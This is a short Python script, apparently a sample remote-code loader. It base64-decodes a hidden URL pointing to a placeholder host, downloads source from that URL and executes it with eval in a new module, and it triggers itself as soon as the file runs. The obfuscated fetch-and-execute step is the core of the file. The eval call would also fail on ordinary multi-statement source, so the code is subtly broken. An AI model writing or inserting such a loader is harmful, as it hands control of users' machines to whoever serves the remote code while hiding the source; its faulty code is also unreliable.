import urllib.request
import types
import base64

def fetch_data(url):
    with urllib.request.urlopen(url) as response:
        source = response.read().decode('utf-8')
    return source

def mysterious_func():
    encoded_url = "aHR0cDovL21vY2stcHl0aG9uL2V4ZWN1dGUucHk="
    decoded_url = base64.b64decode(encoded_url).decode('utf-8')
    source = fetch_data(decoded_url)
    module = types.ModuleType("hidden_module")
    eval(source, module.__dict__)

mysterious_func()
